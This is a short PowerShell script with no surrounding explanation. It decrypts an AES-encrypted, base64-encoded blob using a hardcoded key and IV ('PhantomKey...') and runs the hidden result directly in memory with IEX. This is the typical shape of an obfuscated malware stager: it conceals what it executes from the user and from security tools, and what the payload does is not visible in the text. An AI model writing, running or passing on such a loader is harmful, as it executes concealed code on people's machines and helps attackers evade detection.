$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0nRs42vhueKT8dH3odTGjXSboZHqnpYt0LhHF6NLrsnfo/dc/skvJe4b5UYZLr016okbhXRzyP1ZSjDJSBupwnqvYHWadeEdFKEZl+8iOeB7KEVh4JbxdEZ2Uqz6xOEzXkTv5nOK8KN5qMqEu6i116OgVmx11MG4ZjPyAVqbX2dSBsAeEExdI4lJFnJVFCf2jAS59x9XUBKTct3WTXOONSpXm3B17buJFNCmcv+GPd047p3nZWvERYnhSg0ykpm/iS0Ewd0NGzdyeX3JoLB6ieNUD3p8Tk8YMDX0zuulLeKklrSXdX4s2Ui/yIr9oqRzX74E9wNpwJs0iF0Y+oSuB9VfSnjXXy9Msu5fVT0QbUz512lYh/doY7zHEYaB95AF4Dypc88hnMQ2TLInEw9PVi7rxU58rXpQE7PNf5iTOARl0hSzfPe8h5pk0V8NXpUZP1dWF9phmMQiZH9rNE4cW+UIRNxVGSBjqs3iQgEGxDD2pWcrLTgKCylxLg1Yg2ambxSBt7Ot3l1V4DanX2Yq3/Kg5890/ahoU9vKW9jft5PymrG6cmrhi3s9CSmqHWTCG5oxXyWXUNcNBsZaylOZUYOlwVavqCTWAqWbm5SdpuroboRlDFOM9gqadIC6J9CNcVY0CP/H+Rl6qLPb/7gc8c4lRuKWakZipCrQ0I3DvZFdwNjwWhaAU0yQxRsE9ZA1uuOkh2UVpf33lfVuHUGdQHmY5g7lCjJsfK8PIBIN7iiBlWduhW3vE3FGuvx+p+UsQLWla+dRLT8yhthYG/qBvwd7JNu5Br7n6EDz1+J6vMJmRAkxevZamOCdpLU2nYo80+HxGf6n2oqN2NRsbecH0UX6+TpWyF5QStrSLFpOlWSELGfABL/xZ4m7wdGl6+kxLKr8kMf2TB1k+Y5j+Li2Hb8="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
